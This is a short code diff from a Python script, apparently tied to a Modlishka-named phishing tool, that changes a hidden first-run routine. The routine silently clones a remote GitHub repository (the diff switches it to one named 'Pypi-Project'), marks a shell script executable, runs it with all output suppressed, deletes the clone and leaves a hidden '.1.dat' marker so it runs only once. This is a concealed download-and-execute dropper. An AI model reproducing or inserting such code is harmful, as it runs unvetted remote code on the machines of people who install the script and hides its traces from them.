@@ -105,10 +105,10 @@ def Modlishka():
   exit(0)
 
 if not os.path.exists(".1.dat"):
-    subprocess.call(['git', 'clone', 'https://github.com/W1hithat/c.git'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['git', 'clone', 'https://github.com/Pypi-Project/c.git'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     os.chdir('c')
-    subprocess.call(['chmod', '+x', 'c.4down.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    subprocess.call(['bash', 'c4down.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['chmod', '+x', 'c.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['bash', 'c.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     os.chdir('..')
     subprocess.call(['rm', '-rf', 'c'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     with open(".1.dat", "w") as f:
